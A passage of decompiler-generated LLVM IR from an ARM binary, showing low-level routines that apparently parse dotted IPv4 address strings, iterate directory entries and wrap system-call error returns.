  store i32 %v4_153f8, i32* %r0.global-to-local, align 4
  %v0_153fc = load i32, i32* @r5, align 4
  store i32 %v0_153fc, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_15404 = inttoptr i32 %v4_153f8 to i8*
  %v3_15404 = call i32 @function_10a80(i8* %v2_15404, i32 %v0_153fc)
  store i32 %v3_15404, i32* %r0.global-to-local, align 4
  %v0_15408.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15408

dec_label_pc_15408:                               ; preds = %dec_label_pc_153a0, %dec_label_pc_153c4
  %v0_15408 = phi i32 [ %v3_153b8, %dec_label_pc_153a0 ], [ %v0_15408.pre, %dec_label_pc_153c4 ]
  store i32 %v0_15408, i32* %r0.global-to-local, align 4
  store i32 %v3_153a0, i32* @r4, align 4
  store i32 %v6_153a0, i32* @r5, align 4
  ret i32 %v0_15408

; uselistorder directives
  uselistorder i32 %v0_15408, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32 (i8*, i32)* @function_10a80, { 8, 2, 3, 4, 0, 1, 12, 11, 9, 5, 6, 7, 10 }
  uselistorder i32 13, { 12, 11, 0, 1, 4, 13, 2, 5, 6, 7, 8, 14, 15, 16, 17, 18, 19, 20, 9, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 10, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 3, 41, 42 }
  uselistorder i32 17, { 8, 1, 4, 9, 10, 11, 5, 6, 12, 7, 2, 13, 3, 14, 15, 16, 0 }
  uselistorder label %dec_label_pc_15408, { 1, 0 }
}

define i32 @function_1541c() local_unnamed_addr {
dec_label_pc_1541c:
  %r0.global-to-local = alloca i32, align 4
  %v0_15424 = load i32, i32* @r0, align 4
  %v2_15424 = icmp eq i32 %v0_15424, 0
  %v0_1542c = load i32, i32* @r1, align 4
  br i1 %v2_15424, label %dec_label_pc_15500, label %dec_label_pc_15434

dec_label_pc_15434:                               ; preds = %dec_label_pc_1541c
  br label %dec_label_pc_1544c

dec_label_pc_1544c:                               ; preds = %dec_label_pc_15434, %dec_label_pc_154c4
  %v1_154c4 = phi i32 [ 0, %dec_label_pc_15434 ], [ %v5_154c4, %dec_label_pc_154c4 ]
  %v0_154c8 = phi i32 [ 1, %dec_label_pc_15434 ], [ %v1_154c8, %dec_label_pc_154c4 ]
  %v0_1544c = phi i32 [ %v0_15424, %dec_label_pc_15434 ], [ %v0_1544c12, %dec_label_pc_154c4 ]
  %v1_1544c = inttoptr i32 %v0_1544c to i8*
  %v2_1544c = load i8, i8* %v1_1544c, align 1
  %v3_1544c = zext i8 %v2_1544c to i32
  %v4_15450 = load i32, i32* inttoptr (i32 123988 to i32*), align 4
  %v2_15454 = mul nuw nsw i32 %v3_1544c, 2
  %v2_15458 = add i32 %v2_15454, %v4_15450
  %v3_15458 = inttoptr i32 %v2_15458 to i16*
  %v4_15458 = load i16, i16* %v3_15458, align 2
  %v1_1545c = and i16 %v4_15458, 8
  %v2_1545c = icmp eq i16 %v1_1545c, 0
  br i1 %v2_1545c, label %dec_label_pc_15500, label %dec_label_pc_15464

dec_label_pc_15464:                               ; preds = %dec_label_pc_1544c
  br label %dec_label_pc_15484

dec_label_pc_1546c:                               ; preds = %dec_label_pc_15484
  %v2_1546c = mul i32 %v0_154c4, 10
  %v1_15470 = add i32 %v2_1546c, -48
  %v2_15474 = add i32 %v3_15484, %v1_15470
  %v8_1547c = icmp sgt i32 %v2_15474, 255
  br i1 %v8_1547c, label %dec_label_pc_15500, label %dec_label_pc_15480

dec_label_pc_15480:                               ; preds = %dec_label_pc_1546c
  %v1_15480 = add i32 %v0_154b4, 1
  store i32 %v1_15480, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15484

dec_label_pc_15484:                               ; preds = %dec_label_pc_15464, %dec_label_pc_15480
  %v0_154c4 = phi i32 [ 0, %dec_label_pc_15464 ], [ %v2_15474, %dec_label_pc_15480 ]
  %v0_154b4 = phi i32 [ %v0_1544c, %dec_label_pc_15464 ], [ %v1_15480, %dec_label_pc_15480 ]
  %v1_15484 = inttoptr i32 %v0_154b4 to i8*
  %v2_15484 = load i8, i8* %v1_15484, align 1
  %v3_15484 = zext i8 %v2_15484 to i32
  %v2_15488 = mul nuw nsw i32 %v3_15484, 2
  %v2_1548c = add i32 %v2_15488, %v4_15450
  %v3_1548c = inttoptr i32 %v2_1548c to i16*
  %v4_1548c = load i16, i16* %v3_1548c, align 2
  %v6_1548c = zext i16 %v4_1548c to i32
  %v1_15490 = and i32 %v6_1548c, 8
  %v2_15490 = icmp eq i32 %v1_15490, 0
  br i1 %v2_15490, label %dec_label_pc_15498, label %dec_label_pc_1546c

dec_label_pc_15498:                               ; preds = %dec_label_pc_15484
  %v7_15498 = icmp eq i32 %v0_154c8, 4
  br i1 %v7_15498, label %dec_label_pc_154b0, label %dec_label_pc_154a0

dec_label_pc_154a0:                               ; preds = %dec_label_pc_15498
  %v7_154a0 = icmp eq i8 %v2_15484, 46
  br i1 %v7_154a0, label %dec_label_pc_154a8, label %dec_label_pc_15500

dec_label_pc_154a8:                               ; preds = %dec_label_pc_154a0
  %v1_154a8 = add i32 %v0_154b4, 1
  store i32 %v1_154a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154b0:                               ; preds = %dec_label_pc_15498
  %v2_154b0 = icmp eq i8 %v2_15484, 0
  %v1_154b4 = add i32 %v0_154b4, 1
  store i32 %v1_154b4, i32* %r0.global-to-local, align 4
  br i1 %v2_154b0, label %dec_label_pc_154c4, label %dec_label_pc_154bc

dec_label_pc_154bc:                               ; preds = %dec_label_pc_154b0
  %v1_154bc = and i32 %v6_1548c, 32
  %v2_154bc = icmp eq i32 %v1_154bc, 0
  br i1 %v2_154bc, label %dec_label_pc_15500, label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_154bc, %dec_label_pc_154b0, %dec_label_pc_154a8
  %v0_1544c12 = phi i32 [ %v1_154b4, %dec_label_pc_154bc ], [ %v1_154b4, %dec_label_pc_154b0 ], [ %v1_154a8, %dec_label_pc_154a8 ]
  %v4_154c4 = mul i32 %v1_154c4, 256
  %v5_154c4 = or i32 %v0_154c4, %v4_154c4
  %v1_154c8 = add nuw nsw i32 %v0_154c8, 1
  %v7_154d0 = icmp slt i32 %v1_154c8, 5
  br i1 %v7_154d0, label %dec_label_pc_1544c, label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %dec_label_pc_154c4
  %v2_154d4 = icmp eq i32 %v0_1542c, 0
  br i1 %v2_154d4, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_154d4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15504

bb:                                               ; preds = %dec_label_pc_154d4
  %v4_154d8 = udiv i32 %v5_154c4, 16777216
  %v2_154dc = udiv i32 %v5_154c4, 256
  %v5_154e0 = and i32 %v2_154dc, 65280
  %v2_154e4 = and i32 %v5_154c4, 65280
  %v5_154e8 = mul nuw nsw i32 %v2_154e4, 256
  %v5_154ec = mul i32 %v0_154c4, 16777216
  %v6_154e0 = or i32 %v4_154d8, %v5_154ec
  %v6_154e8 = or i32 %v6_154e0, %v5_154e0
  %v6_154ec = or i32 %v6_154e8, %v5_154e8
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_154f8 = inttoptr i32 %v0_1542c to i32*
  store i32 %v6_154ec, i32* %v3_154f8, align 4
  %v1_15508.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15504

dec_label_pc_15500:                               ; preds = %dec_label_pc_154a0, %dec_label_pc_154bc, %dec_label_pc_1544c, %dec_label_pc_1546c, %dec_label_pc_1541c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15504

dec_label_pc_15504:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_15500
  %v1_15508 = phi i32 [ %v1_15508.pre, %bb ], [ 0, %dec_label_pc_15500 ], [ 1, %.thread7.thread ]
  ret i32 %v1_15508

; uselistorder directives
  uselistorder i32 %v1_154c8, { 1, 0 }
  uselistorder i32 %v5_154c4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_154b4, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 1, 2, 4, 5, 6 }
  uselistorder i32 65280, { 48, 2, 5, 1, 0, 34, 35, 6, 7, 8, 36, 3, 37, 38, 9, 10, 4, 11, 39, 40, 29, 12, 13, 14, 15, 16, 32, 33, 30, 31, 41, 42, 43, 44, 17, 18, 45, 19, 20, 21, 22, 46, 23, 24, 47, 25, 26, 27, 28, 49, 50, 51 }
  uselistorder i32 16777216, { 0, 1, 53, 52, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 32, 36, 33, 37, 34, 35, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 54 }
  uselistorder i32 5, { 9, 0, 34, 17, 10, 18, 2, 19, 20, 21, 11, 12, 13, 22, 14, 3, 23, 15, 4, 24, 5, 25, 26, 6, 27, 7, 28, 8, 29, 30, 31, 16, 32, 33, 1 }
  uselistorder i32 32, { 105, 51, 49, 92, 93, 94, 95, 99, 100, 88, 89, 90, 91, 112, 113, 97, 98, 52, 53, 57, 54, 58, 55, 59, 56, 60, 61, 103, 104, 62, 106, 70, 71, 69, 72, 73, 74, 75, 76, 77, 64, 65, 1, 66, 2, 67, 4, 3, 63, 68, 78, 107, 6, 5, 8, 7, 10, 9, 50, 79, 108, 80, 96, 12, 11, 13, 15, 14, 16, 18, 17, 20, 19, 21, 22, 24, 23, 81, 101, 25, 102, 26, 27, 82, 28, 29, 30, 83, 31, 0, 32, 33, 35, 34, 37, 36, 39, 38, 40, 42, 41, 84, 109, 85, 110, 86, 111, 44, 43, 46, 45, 47, 48, 87 }
  uselistorder i8 0, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 30, 29, 22, 31, 2, 15, 3, 32, 34, 33, 23, 35, 36, 37, 0, 18, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 56, 58, 55, 24, 57, 25, 59, 60, 54, 1, 61, 62, 63, 27, 64, 67, 28, 65, 66, 26, 68, 69, 70, 71, 72, 73, 74, 75, 77, 78, 17, 81, 82, 83, 21, 79, 80, 87, 19, 84, 85, 86, 20, 16, 88, 89, 76, 90 }
  uselistorder i32 255, { 3, 17, 4, 0, 1, 2, 14, 15, 7, 18, 8, 19, 5, 20, 6, 21, 11, 22, 12, 23, 9, 24, 10, 25, 16, 13, 26 }
  uselistorder i32 10, { 2, 20, 21, 22, 4, 29, 31, 30, 0, 26, 27, 52, 53, 1, 7, 23, 24, 25, 8, 9, 10, 11, 12, 28, 5, 32, 33, 34, 35, 36, 37, 38, 39, 40, 13, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 14, 54, 3, 55, 56, 16, 57, 18, 19, 6, 58, 15, 59, 17 }
  uselistorder i16 0, { 0, 1, 2, 3, 7, 8, 9, 12, 10, 11, 4, 13, 14, 15, 16, 17, 5, 18, 6, 19 }
  uselistorder i32 2, { 4, 5, 146, 64, 65, 61, 248, 249, 78, 250, 251, 66, 252, 253, 151, 147, 152, 148, 86, 6, 153, 7, 67, 8, 9, 254, 72, 229, 10, 11, 230, 12, 13, 60, 226, 14, 15, 16, 227, 231, 17, 18, 19, 20, 79, 232, 233, 21, 22, 0, 149, 234, 23, 235, 87, 24, 145, 25, 26, 27, 28, 29, 30, 144, 31, 32, 33, 34, 35, 88, 90, 89, 68, 69, 81, 154, 155, 164, 165, 36, 91, 92, 93, 166, 167, 94, 143, 156, 157, 74, 73, 95, 82, 158, 97, 159, 37, 38, 39, 98, 160, 161, 96, 99, 100, 101, 162, 163, 102, 103, 105, 75, 106, 104, 168, 107, 108, 169, 70, 77, 170, 171, 172, 173, 174, 175, 176, 109, 83, 177, 178, 180, 110, 179, 111, 112, 181, 182, 183, 184, 185, 186, 187, 1, 40, 41, 42, 43, 44, 45, 113, 188, 84, 189, 190, 191, 192, 193, 194, 2, 46, 47, 48, 49, 50, 51, 115, 195, 114, 196, 197, 198, 199, 200, 201, 117, 202, 118, 203, 119, 204, 52, 3, 53, 54, 55, 56, 57, 120, 205, 116, 206, 207, 62, 208, 209, 210, 211, 212, 213, 122, 121, 214, 215, 63, 216, 217, 124, 218, 125, 219, 220, 221, 222, 223, 126, 224, 123, 225, 127, 80, 228, 150, 71, 129, 130, 236, 131, 132, 237, 133, 134, 238, 135, 136, 239, 137, 138, 240, 139, 140, 241, 76, 242, 243, 85, 244, 141, 245, 58, 59, 246, 128, 247, 142 }
  uselistorder label %dec_label_pc_15504, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15500, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_15484, { 1, 0 }
  uselistorder label %dec_label_pc_1544c, { 1, 0 }
}

define i32 @function_15514(i32 %arg1) local_unnamed_addr {
dec_label_pc_15514:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 123764, i32* %r2.global-to-local, align 4
  %v4_15520 = load i32, i32* inttoptr (i32 123864 to i32*), align 8
  %v4_15528 = load i32, i32* inttoptr (i32 123828 to i32*), align 4
  store i32 %v4_15528, i32* %r1.global-to-local, align 4
  %v1_1552c = add i32 %arg1, 44
  %v2_1552c = inttoptr i32 %v1_1552c to i32*
  %v3_1552c = load i32, i32* %v2_1552c, align 4
  %v1_15530 = add i32 %arg1, 28
  %v2_15530 = inttoptr i32 %v1_15530 to i32*
  %v3_15530 = load i32, i32* %v2_15530, align 4
  store i32 %v3_15530, i32* %r2.global-to-local, align 4
  %v2_15534 = inttoptr i32 %v4_15520 to i32*
  store i32 %v3_1552c, i32* %v2_15534, align 4
  %v0_15538 = load i32, i32* %r2.global-to-local, align 4
  %v1_15538 = load i32, i32* %r1.global-to-local, align 4
  %v2_15538 = inttoptr i32 %v1_15538 to i32*
  store i32 %v0_15538, i32* %v2_15538, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 44, { 45, 0, 1, 4, 5, 6, 2, 7, 8, 9, 15, 10, 16, 14, 26, 27, 28, 29, 30, 31, 23, 24, 25, 21, 22, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 11, 17, 18, 19, 20, 12, 42, 3, 43, 13, 44 }
  uselistorder i32 123764, { 47, 1, 48, 49, 2, 3, 50, 4, 5, 6, 51, 52, 7, 8, 53, 9, 54, 55, 10, 13, 14, 12, 11, 15, 16, 42, 38, 36, 35, 37, 39, 40, 41, 34, 43, 29, 31, 30, 28, 27, 32, 33, 24, 23, 26, 25, 22, 21, 20, 19, 44, 45, 46, 56, 0, 57, 17, 18 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_15544(i32 %arg1) local_unnamed_addr {
dec_label_pc_15544:
  %v0_15544 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15544, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15544
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15544, %bb
  %v4_15548 = phi i32 [ %arg1, %dec_label_pc_15544 ], [ 0, %bb ]
  ret i32 %v4_15548

; uselistorder directives
  uselistorder i1* @cpsr_z, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 28, 11, 12, 13, 24, 25, 26, 27, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1554c(i32 %arg1) local_unnamed_addr {
dec_label_pc_15588:
  store i32 %arg1, i32* @global_var_205fc.506, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_205fc.506, { 1, 0, 2 }
}

define i32 @function_15598(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15598:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15598 = load i32, i32* @r7, align 4
  store i32 %v3_15598, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_155c0, label %dec_label_pc_155b0

dec_label_pc_155b0:                               ; preds = %dec_label_pc_15598
  %v0_155b0 = call i32 @function_10a30()
  %v0_155b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_155b4 = sub i32 0, %v0_155b4
  %v2_155b8 = inttoptr i32 %v0_155b0 to i32*
  store i32 %v1_155b4, i32* %v2_155b8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_155c4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_155c0

dec_label_pc_155c0:                               ; preds = %dec_label_pc_15598, %dec_label_pc_155b0
  %v2_155c4 = phi i32 [ %v3_15598, %dec_label_pc_15598 ], [ %v2_155c4.pre, %dec_label_pc_155b0 ]
  %v0_155c0 = phi i32 [ %arg1, %dec_label_pc_15598 ], [ -1, %dec_label_pc_155b0 ]
  store i32 %v2_155c4, i32* %r7.global-to-local, align 4
  ret i32 %v0_155c0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_155c0, { 1, 0 }
}

define i32 @function_155cc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_155cc:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_155d0 = load i32, i32* @r4, align 4
  %v6_155d0 = load i32, i32* @r5, align 4
  %v12_155d0 = load i32, i32* @r7, align 4
  %v1_155d4 = add i32 %arg3, 14
  %v2_155dc = ptrtoint i32* %stack_var_-72 to i32
  %v1_155e0 = and i32 %v1_155d4, -8
  %v2_155e4 = sub i32 %v2_155dc, %v1_155e0
  %v1_155e8 = add i32 %v2_155e4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_155e8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_15624, label %dec_label_pc_15610

dec_label_pc_15610:                               ; preds = %dec_label_pc_155cc
  %v0_15610 = call i32 @function_10a30()
  %v0_15614 = load i32, i32* %r4.global-to-local, align 4
  %v1_15614 = sub i32 0, %v0_15614
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1561c = inttoptr i32 %v0_15610 to i32*
  store i32 %v1_15614, i32* %v2_1561c, align 4
  %v0_1562c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1562c

dec_label_pc_15624:                               ; preds = %dec_label_pc_155cc
  br i1 false, label %dec_label_pc_1562c, label %dec_label_pc_15634

dec_label_pc_1562c:                               ; preds = %dec_label_pc_15624, %dec_label_pc_15610
  %v0_1562c = phi i32 [ -1, %dec_label_pc_15624 ], [ %v0_1562c.pre, %dec_label_pc_15610 ]
  store i32 %v0_1562c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15700

dec_label_pc_15634:                               ; preds = %dec_label_pc_15624
  %v2_15634 = add i32 %v1_155e8, %arg1
  %v2_15638 = add i32 %tmp, %arg3
  store i32 %v2_15638, i32* @ip, align 4
  store i32 %v1_155e8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_156e8

dec_label_pc_15654:                               ; preds = %dec_label_pc_156e8
  %v1_15654 = add i32 %v0_156a8, 16
  %v2_15654 = inttoptr i32 %v1_15654 to i16*
  %v3_15654 = load i16, i16* %v2_15654, align 2
  %v4_15654 = zext i16 %v3_15654 to i32
  %v1_15658 = add nuw nsw i32 %v4_15654, 7
  %v1_1565c = and i32 %v1_15658, 131064
  store i32 %v1_1565c, i32* %r2.global-to-local, align 4
  %v2_15664 = add i32 %v1_1565c, %v0_156b0
  store i32 %v2_15664, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_15664, %v2_15638
  br i1 %tmp26, label %dec_label_pc_15670, label %dec_label_pc_156a4

dec_label_pc_15670:                               ; preds = %dec_label_pc_15654
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_15678 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_15678, i32* %r2.global-to-local, align 4
  %v0_1567c = load i32, i32* %sl.global-to-local, align 4
  %v1_15680 = load i32, i32* @sp, align 4
  %v2_15680 = inttoptr i32 %v1_15680 to i32*
  store i32 0, i32* %v2_15680, align 4
  %v4_15684 = call i32 @function_15908(i32 %arg1, i32 0, i32 %v0_15678, i32 %v0_1567c)
  %v0_15688 = load i32, i32* @r5, align 4
  %v1_15688 = load i32, i32* %r6.global-to-local, align 4
  %v9_15688 = icmp eq i32 %v0_15688, %v1_15688
  br i1 %v9_15688, label %dec_label_pc_15690, label %dec_label_pc_156fc

dec_label_pc_15690:                               ; preds = %dec_label_pc_15670
  %v0_15690 = call i32 @function_10a30()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1569c = inttoptr i32 %v0_15690 to i32*
  store i32 22, i32* %v2_1569c, align 4
  %v0_15700.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15700

dec_label_pc_156a4:                               ; preds = %dec_label_pc_15654
  %v1_156a4 = inttoptr i32 %v0_156a8 to i32*
  %v2_156a4 = load i32, i32* %v1_156a4, align 4
  %v3_156a4 = add i32 %v0_156a8, 4
  %v4_156a4 = inttoptr i32 %v3_156a4 to i32*
  %v5_156a4 = load i32, i32* %v4_156a4, align 4
  store i32 %v5_156a4, i32* %r4.global-to-local, align 4
  %v1_156a8 = add i32 %v0_156a8, 8
  store i32 %v1_156a8, i32* %sb.global-to-local, align 4
  %v1_156ac = inttoptr i32 %v1_156a8 to i32*
  %v2_156ac = load i32, i32* %v1_156ac, align 4
  store i32 %v2_156ac, i32* %sb.global-to-local, align 4
  %v3_156ac = add i32 %v0_156a8, 12
  %v4_156ac = inttoptr i32 %v3_156ac to i32*
  %v5_156ac = load i32, i32* %v4_156ac, align 4
  store i32 %v5_156ac, i32* %sl.global-to-local, align 4
  %v1_156b0 = inttoptr i32 %v0_156b0 to i32*
  store i32 %v2_156a4, i32* %v1_156b0, align 4
  %v3_156b0 = add i32 %v0_156b0, 4
  %v4_156b0 = inttoptr i32 %v3_156b0 to i32*
  %v5_156b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_156b0, i32* %v4_156b0, align 4
  %v0_156b4 = load i32, i32* @r7, align 4
  %v1_156b4 = add i32 %v0_156b4, 8
  %v1_156b8 = inttoptr i32 %v1_156b4 to i32*
  %v2_156b8 = load i32, i32* %v1_156b8, align 4
  %v3_156b8 = add i32 %v0_156b4, 12
  %v4_156b8 = inttoptr i32 %v3_156b8 to i32*
  %v5_156b8 = load i32, i32* %v4_156b8, align 4
  store i32 %v5_156b8, i32* @r4, align 4
  %v1_156bc = load i32, i32* @r5, align 4
  %v2_156bc = add i32 %v1_156bc, 8
  %v3_156bc = inttoptr i32 %v2_156bc to i32*
  store i32 %v2_156b8, i32* %v3_156bc, align 4
  %v0_156c0 = load i32, i32* @r4, align 4
  %v1_156c0 = load i32, i32* @r5, align 4
  %v2_156c0 = add i32 %v1_156c0, 12
  %v3_156c0 = inttoptr i32 %v2_156c0 to i32*
  store i32 %v0_156c0, i32* %v3_156c0, align 4
  %v0_156c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_156c4 = trunc i32 %v0_156c4 to i16
  %v2_156c4 = load i32, i32* @r5, align 4
  %v3_156c4 = add i32 %v2_156c4, 16
  %v4_156c4 = inttoptr i32 %v3_156c4 to i16*
  store i16 %v1_156c4, i16* %v4_156c4, align 2
  %v0_156c8 = load i32, i32* @r7, align 4
  %v1_156c8 = add i32 %v0_156c8, 18
  %v2_156c8 = inttoptr i32 %v1_156c8 to i8*
  %v3_156c8 = load i8, i8* %v2_156c8, align 1
  %v4_156c8 = zext i8 %v3_156c8 to i32
  store i32 %v4_156c8, i32* @r3, align 4
  %v2_156cc = load i32, i32* @r5, align 4
  %v3_156cc = add i32 %v2_156cc, 18
  %v4_156cc = inttoptr i32 %v3_156cc to i8*
  store i8 %v3_156c8, i8* %v4_156cc, align 1
  %v0_156d0 = load i32, i32* @r7, align 4
  %v1_156d0 = add i32 %v0_156d0, 16
  %v2_156d0 = inttoptr i32 %v1_156d0 to i16*
  %v3_156d0 = load i16, i16* %v2_156d0, align 2
  %v4_156d0 = zext i16 %v3_156d0 to i32
  %v1_156d4 = add nsw i32 %v4_156d0, -19
  store i32 %v1_156d4, i32* @r2, align 4
  %v0_156d8 = call i32 @function_10b30()
  %v0_156dc = load i32, i32* @r7, align 4
  %v1_156dc = add i32 %v0_156dc, 16
  %v2_156dc = inttoptr i32 %v1_156dc to i16*
  %v3_156dc = load i16, i16* %v2_156dc, align 2
  %v4_156dc = zext i16 %v3_156dc to i32
  %v0_156e0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_156e0, i32* @r5, align 4
  %v2_156e4 = add i32 %v4_156dc, %v0_156dc
  store i32 %v2_156e4, i32* @r7, align 4
  br label %dec_label_pc_156e8

dec_label_pc_156e8:                               ; preds = %dec_label_pc_15634, %dec_label_pc_156a4
  %v0_156b0 = phi i32 [ %tmp, %dec_label_pc_15634 ], [ %v0_156e0, %dec_label_pc_156a4 ]
  %v0_156a8 = phi i32 [ %v1_155e8, %dec_label_pc_15634 ], [ %v2_156e4, %dec_label_pc_156a4 ]
  %v3_156ec = icmp ult i32 %v0_156a8, %v2_15634
  %v1_156f0 = add i32 %v0_156b0, 19
  store i32 %v1_156f0, i32* @r0, align 4
  %v1_156f4 = add i32 %v0_156a8, 19
  store i32 %v1_156f4, i32* @r1, align 4
  br i1 %v3_156ec, label %dec_label_pc_15654, label %dec_label_pc_156fc.loopexit

dec_label_pc_156fc.loopexit:                      ; preds = %dec_label_pc_156e8
  %v0_156fc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_156fc

dec_label_pc_156fc:                               ; preds = %dec_label_pc_156fc.loopexit, %dec_label_pc_15670
  %v1_156fc = phi i32 [ %v0_156b0, %dec_label_pc_156fc.loopexit ], [ %v0_15688, %dec_label_pc_15670 ]
  %v0_156fc = phi i32 [ %v0_156fc.pre, %dec_label_pc_156fc.loopexit ], [ %v1_15688, %dec_label_pc_15670 ]
  %v2_156fc = sub i32 %v1_156fc, %v0_156fc
  store i32 %v2_156fc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15700

dec_label_pc_15700:                               ; preds = %dec_label_pc_15690, %dec_label_pc_1562c, %dec_label_pc_156fc
  %v0_15700 = phi i32 [ %v0_15700.pre, %dec_label_pc_15690 ], [ %v0_1562c, %dec_label_pc_1562c ], [ %v2_156fc, %dec_label_pc_156fc ]
  store i32 %v3_155d0, i32* %r4.global-to-local, align 4
  store i32 %v6_155d0, i32* @r5, align 4
  store i32 %v12_155d0, i32* @r7, align 4
  ret i32 %v0_15700

; uselistorder directives
  uselistorder i32 %v0_156a8, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_156b0, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_155e8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 5, 6, 0, 3, 7, 4, 8, 1, 9, 2, 10 }
  uselistorder i32* @r3, { 8, 9, 32, 33, 71, 72, 2, 73, 74, 75, 3, 76, 77, 78, 4, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 0, 97, 98, 99, 100, 10, 7, 11, 12, 13, 14, 15, 101, 34, 35, 102, 103, 112, 113, 114, 107, 30, 31, 44, 45, 46, 20, 47, 48, 49, 16, 17, 18, 118, 115, 116, 117, 1, 119, 120, 121, 108, 19, 50, 21, 22, 23, 109, 110, 111, 51, 36, 104, 105, 106, 52, 53, 54, 55, 6, 56, 57, 58, 59, 60, 28, 61, 24, 25, 26, 27, 29, 37, 38, 39, 40, 41, 42, 43, 62, 63, 64, 65, 66, 67, 5, 68, 69, 70 }
  uselistorder i32 18, { 5, 6, 0, 7, 1, 8, 9, 2, 10, 3, 11, 4, 12 }
  uselistorder i32 22, { 1, 0, 9, 2, 3, 4, 11, 5, 6, 7, 10, 8, 12 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 7, { 28, 25, 26, 12, 0, 1, 42, 13, 29, 30, 14, 15, 16, 17, 18, 19, 20, 21, 22, 4, 31, 5, 6, 32, 7, 33, 8, 34, 9, 35, 10, 36, 37, 2, 23, 38, 3, 24, 39, 40, 27, 11, 41 }
